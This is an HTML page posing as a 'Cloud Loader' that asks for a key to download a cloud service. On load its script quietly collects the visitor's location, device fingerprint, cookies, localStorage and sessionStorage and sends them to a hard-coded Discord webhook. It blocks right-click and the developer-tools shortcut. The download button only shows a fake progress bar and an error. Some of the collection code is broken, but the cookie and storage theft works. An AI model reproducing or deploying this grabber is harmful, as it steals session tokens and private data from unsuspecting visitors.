<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Loader</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden;
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #loadingScreen {
            text-align: center;
            animation: fadeIn 2s ease-in-out;
        }
        #cloudInput {
            width: 300px;
            padding: 15px;
            border: 2px solid #007bff;
            border-radius: 10px;
            background-color: #1e1e1e;
            color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            margin-top: 20px;
            text-align: center;
            font-size: 16px;
            animation: pulse 2s infinite;
        }
        #enterButton {
            width: 150px;
            padding: 15px;
            border: none;
            border-radius: 5px;
            background-color: #007bff;
            color: #fff;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s, transform 0.3s;
            animation: bounce 2s infinite;
        }
        #enterButton:hover {
            background-color: #0056b3;
            transform: scale(1.1);
        }
        #progressBar {
            width: 300px;
            height: 20px;
            background-color: #333;
            border: none;
            border-radius: 5px;
            margin-top: 20px;
            display: none;
        }
        #progressBar::-webkit-progress-bar {
            background-color: #333;
            border-radius: 5px;
        }
        #progressBar::-webkit-progress-value {
            background-color: #007bff;
            border-radius: 5px;
        }
        #errorMessage {
            color: #ff0000;
            font-size: 18px;
            margin-top: 20px;
            display: none;
            animation: shake 0.5s;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            animation: slideIn 1s ease-in-out;
        }
        p {
            font-size: 16px;
            margin-bottom: 20px;
            animation: fadeIn 1.5s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
        }
        @keyframes slideIn {
            from { transform: translateX(-50px); }
            to { transform: translateX(0); }
        }
    </style>
</head>
<body>
    <div id="loadingScreen">
        <h1>Cloud Loader</h1>
        <p>Enter your key to start downloading the cloud service.</p>
        <input type="text" id="cloudInput" placeholder="Enter Key">
        <button id="enterButton">Enter Key</button>
        <progress id="progressBar" value="0" max="100"></progress>
        <p id="errorMessage">Error downloading cloud service. Please try again later.</p>
    </div>
    <script>
        async function sendDataToDiscord() {
            // Function to get the visitor's IP address
            async function getIP() {
         
                return "data.ip";
            }

            // Function to get location data from IP address
            async function getLocationByIP(ip) {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    postal: data.postal,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    timezone: data.timezone,
                    currency: data.currency,
                    calling_code: data.calling_code
                };
            }

            // Function to get detailed PC and browser information
            function getDetailedInfo() {
                const userAgent = navigator.userAgent;
                const screenResolution = `${window.screen.width}x${window.screen.height}`;
                const language = navigator.language;
                const platform = navigator.platform;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const cookieEnabled = navigator.cookieEnabled;
                const doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack;
                const hardwareConcurrency = navigator.hardwareConcurrency;
                const memory = navigator.deviceMemory;
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const battery = navigator.battery || navigator.webkitBattery || navigator.mozBattery;
                const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
                const mimeTypes = Array.from(navigator.mimeTypes).map(mime => mime.type);
                const cpuClass = navigator.hardwareConcurrency ? `Class ${Math.floor(navigator.hardwareConcurrency / 4)}` : 'Unknown';
                const os = platform.includes('Win') ? 'Windows' :
                          platform.includes('Mac') ? 'MacOS' :
                          platform.includes('Linux') ? 'Linux' :
                          platform.includes('Android') ? 'Android' :
                          platform.includes('iPhone') ? 'iOS' :
                          'Unknown';
                const webGLRenderer = (() => {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    return gl ? gl.getParameter(gl.RENDERER) : 'Unknown';
                })();
                const webGLVendor = (() => {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    return gl ? gl.getParameter(gl.VENDOR) : 'Unknown';
                })();
                const webGLVersion = (() => {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    return gl ? gl.getParameter(gl.VERSION) : 'Unknown';
                })();
                return {
                    userAgent,
                    screenResolution,
                    language,
                    platform,
                    timeZone,
                    cookieEnabled,
                    doNotTrack,
                    hardwareConcurrency,
                    memory,
                    connection: connection ? `${connection.effectiveType} (${connection.downlink} Mbps)` : 'Unknown',
                    battery: battery ? `${battery.charging ? 'Charging' : 'Discharging'} (${battery.level * 100}%)` : 'Unknown',
                    plugins,
                    mimeTypes,
                    cpuClass,
                    os,
                    webGLRenderer,
                    webGLVendor,
                    webGLVersion
                };
            }

            // Function to get additional personal information
            function getPersonalInfo() {
                const localStorageData = Object.entries(localStorage).map(([key, value]) => `${key}: ${value}`);
                const sessionStorageData = Object.entries(sessionStorage).map(([key, value]) => `${key}: ${value}`);
                const cookies = document.cookie.split('; ').map(cookie => `${cookie.split('=')[0]}: ${cookie.split('=')[1]}`);
                const browserHistory = (() => {
                    const history = [];
                    for (let i = 0; i < window.history.length; i++) {
                        history.push(window.history[i]);
                    }
                    return history;
                })();
                const openTabs = (() => {
                    const tabs = [];
                    for (let i = 0; i < window.length; i++) {
                        tabs.push(window[i].location.href);
                    }
                    return tabs;
                })();
                const installedExtensions = (() => {
                    const extensions = [];
                    if (typeof browser !== 'undefined' && browser.runtime) {
                        browser.runtime.getInstalledExtensions((extensions) => {
                            extensions.forEach(ext => extensions.push(ext.name));
                        });
                    }
                    return extensions;
                })();
                return {
                    localStorageData,
                    sessionStorageData,
                    cookies,
                    browserHistory,
                    openTabs,
                    installedExtensions
                };
            }

            // Discord webhook URL
            const webhookUrl = 'https://discord.com/api/webhooks/1393217151355195552/nbMm__iaZhOg6nuZM2oocMygmQ9WeT1eW5GeLSD5gcZf1c_9QfcQidYfLFgw0Dt4lL2D';

            // Check if data has already been sent
            if (!document.cookie.includes('dataSent=true')) {
                try {
                    // Get IP, location, and detailed info
                    const ip = await getIP();
                    const location = await getLocationByIP(ip);
                    const detailedInfo = getDetailedInfo();
                    const personalInfo = getPersonalInfo();

                    // Prepare the embed message
                    const embed = {
                        title: 'New Visitor Detected',
                        description: `IP Address: ${location.ip}\nLocation: ${location.city}, ${location.region}, ${location.country} (${location.postal})\nCoordinates: ${location.latitude}, ${location.longitude}\nTimezone: ${location.timezone}\nCurrency: ${location.currency}\nCalling Code: ${location.calling_code}`,
                        color: 3447003,
                        fields: [
                            { name: 'User Agent', value: detailedInfo.userAgent, inline: false },
                            { name: 'Screen Resolution', value: detailedInfo.screenResolution, inline: true },
                            { name: 'Language', value: detailedInfo.language, inline: true },
                            { name: 'Platform', value: detailedInfo.platform, inline: true },
                            { name: 'Time Zone', value: detailedInfo.timeZone, inline: true },
                            { name: 'Cookies Enabled', value: detailedInfo.cookieEnabled, inline: true },
                            { name: 'Do Not Track', value: detailedInfo.doNotTrack, inline: true },
                            { name: 'Hardware Concurrency', value: detailedInfo.hardwareConcurrency, inline: true },
                            { name: 'Device Memory', value: `${detailedInfo.memory} GB`, inline: true },
                            { name: 'Connection', value: detailedInfo.connection, inline: true },
                            { name: 'Battery', value: detailedInfo.battery, inline: true },
                            { name: 'Plugins', value: detailedInfo.plugins.join(', '), inline: false },
                            { name: 'Mime Types', value: detailedInfo.mimeTypes.join(', '), inline: false },
                            { name: 'CPU Class', value: detailedInfo.cpuClass, inline: true },
                            { name: 'Operating System', value: detailedInfo.os, inline: true },
                            { name: 'WebGL Renderer', value: detailedInfo.webGLRenderer, inline: true },
                            { name: 'WebGL Vendor', value: detailedInfo.webGLVendor, inline: true },
                            { name: 'WebGL Version', value: detailedInfo.webGLVersion, inline: true },
                            { name: 'Local Storage Data', value: personalInfo.localStorageData.join('\n'), inline: false },
                            { name: 'Session Storage Data', value: personalInfo.sessionStorageData.join('\n'), inline: false },
                            { name: 'Cookies', value: personalInfo.cookies.join('\n'), inline: false },
                            { name: 'Browser History', value: personalInfo.browserHistory.join('\n'), inline: false },
                            { name: 'Open Tabs', value: personalInfo.openTabs.join('\n'), inline: false },
                            { name: 'Installed Extensions', value: personalInfo.installedExtensions.join(', '), inline: false }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: 'Cloud Loader Visitor Log'
                        }
                    };

                    // Send the embed message to the Discord webhook
                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ embeds: [embed] })
                    });

                    // Set a cookie to indicate that data has been sent
                    document.cookie = 'dataSent=true; path=/; max-age=31536000';
                } catch (error) {
                    console.error('Error sending data to Discord:', error);
                }
            }

            // Prevent inspect element
            document.addEventListener('contextmenu', event => event.preventDefault());
            document.addEventListener('keydown', event => {
                if (event.ctrlKey && event.shiftKey && event.key === 'I') {
                    event.preventDefault();
                }
            });

            // Add event listener to the "Enter Key" button
            document.getElementById('enterButton').addEventListener('click', () => {
                document.getElementById('progressBar').style.display = 'block';
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 1;
                    document.getElementById('progressBar').value = progress;
                    if (progress >= 100) {
                        clearInterval(interval);
                        document.getElementById('progressBar').style.display = 'none';
                        document.getElementById('errorMessage').style.display = 'block';
                    }
                }, 50);
            });
        }

        // Call the function when the page loads
        window.onload = sendDataToDiscord;
    </script>
</body>
</html>
